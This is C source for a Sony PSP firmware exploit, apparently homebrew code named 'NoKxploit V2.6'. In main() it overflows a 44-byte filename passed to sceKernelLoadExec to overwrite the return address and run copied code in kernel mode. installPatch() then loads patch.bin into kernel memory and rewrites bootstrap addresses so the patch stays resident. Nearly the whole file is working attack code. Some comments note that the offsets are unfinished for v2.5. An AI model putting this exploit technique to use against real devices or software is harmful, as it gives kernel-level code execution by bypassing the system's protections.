#include <pspsdk.h>
#include <pspkernel.h>
#include <pspdebug.h>


PSP_MODULE_INFO("NoKxploit V2.6", 0x1000, 1, 1);
PSP_MAIN_THREAD_ATTR(0);

int installPatch()
{
	SceUID fd;

	fd = sceIoOpen("patch.bin", PSP_O_RDONLY, 0777);

	if (fd < 0)
	{
		pspDebugScreenInit();
		pspDebugScreenPrintf("Unable to open file, fd=%x\n", fd);

		return 0;
	}
pspDebugScreenPrintf("File loading\n");

	sceIoRead(fd, (void *)0x883e0000, 10*1024);
	sceIoClose(fd);

#if 0
	// Firmware v1.5 dump
    2354:  0c0009ca  jal        0x2728 --> sceKernelDcacheWritebackAll
    2358:  00000000  nop
    235c:  0c0009cc  jal        0x2730 --> sceKernelIcacheInvalidateAll
    2360:  00000000  nop
    2364:  3c040000  lui        a0,0
    2368:  0c000994  jal        0x2650 --> unknown function (Hash = 84F370BC)
    236c:  24843134  addiu      a0,a0,12596
    2370:  3c040000  lui        a0,0
    2374:  0c000994  jal        0x2650 --> unknown function (Hash = 84F370BC)
    2378:  24843150  addiu      a0,a0,12624
    237c:  02402021  addu       a0,zero,32
    2380:  02202821  addu       a1,zero,32
//    2384:  3c0188c0  lui        at,0x88c0 <- This is the one 
    2388:  0020f809  jalr       ra,zero,32
#endif

	// Should we just search for 3c0188c0 and replace all of them
	// this way it will be version independant

	// Redirect system bootstrap (sceLoadExec module, "game" mode)
	// c0 88 01 3c lui $at, 0x88c0 -> 3e 88 01 3c lui $at, 0x883e
	// 09 f8 20 00 jalr $ra, $at
//	_sh(0x883e, 0x88069684);
	_sh(0x883e, 0x88065658);	// Need to sort this out for v2.5
	
	// The same here, for "vsh" and "updater" modes (sceLoadExec
	// module loads to a different location in those modes)
//	_sh(0x883e, 0x880bce84);
	_sh(0x883e, 0x880BEA58);	// Need to sort this out for v2.5

	//sceKernelDcacheWritebackAll();

	return 1;
}

int kernel_proc()
{
	pspDebugScreenInit();

	pspDebugScreenPrintf("Patching\n");

	// Lets get the patches installed to keep resident during resets
	installPatch();

	pspDebugScreenPrintf("Done patching\n");

	int i;
	for(i=0; i<1000; i++)
		sceDisplayWaitVblankStart();

	sceKernelExitGame();
}

// -------------------------------------------
// Program entry point
int main(int argc, char* argv[]) {
	int i;
   	int handle;
   
	char filename[256];
	unsigned int *dwfilename;
	// This address must *NOT* contains a 00
	unsigned int *loop = (unsigned int *) 0x9f02020;
	unsigned int *loopsrc = (unsigned int *) &kernel_proc;
	char *msg = "chhikr hitchhikr hitchhikr hitchhikr hitchik";

	sceKernelDcacheWritebackAll();

	// Copy the test code into a safe place
	for(i = 0; i < 100; i++) {
		loop[i] = loopsrc[i];
	}
	memset(filename, 0, sizeof(filename));
	// Fill it with shit (*MUST* be 44 bytes)
	for(i = 0; i < 44; i++) {
		filename[i] = msg[i];
	}
	// Own the $ra
	dwfilename = (unsigned int *) &filename[44];
	dwfilename[0] = (unsigned int) loop;
	// Complete the string
	filename[48] = ':';
	filename[49] = '\0';

	// We need this for some odd flushing (?) reasons
	handle = sceIoOpen("ms0:/odd.BIN", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
	sceIoWrite(handle, dwfilename, 4);
	sceIoClose(handle);

	sceKernelLoadExec(filename, NULL); 	
	return(0);
}

